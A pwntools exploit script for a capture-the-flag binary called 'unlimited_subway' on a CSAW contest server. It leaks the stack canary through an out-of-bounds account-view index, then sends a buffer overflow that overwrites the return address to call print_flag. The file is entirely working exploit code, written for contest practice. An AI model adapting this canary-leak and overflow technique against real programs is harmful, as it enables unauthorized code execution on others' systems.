#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./unlimited_subway", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc pwn.csaw.io 7900"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


def view_account(idx):
    io.sendlineafter(b"> ", b"V")
    io.sendlineafter(b"Index : ", str(idx).encode())
    data = int(io.recvline().strip().split(b" : ")[-1], 16)
    print(hex(data))
    return data


io.sendlineafter(b"> ", b"F")
io.sendlineafter(b"Data : ", cyclic(0x20))
canary_idx = 0x80
canary = 0
for i in range(4):
    canary <<= 8
    canary |= view_account(canary_idx + 3 - i)

log.info(f"{canary=:#x}")

io.sendlineafter(b"> ", b"E")
sz = 0x200
io.sendlineafter(b"Size : ", str(sz).encode())
payload = b"A" * 0x40
payload += flat(canary, elf.bss(0x800), elf.symbols["print_flag"])
io.sendline(payload)

io.interactive()
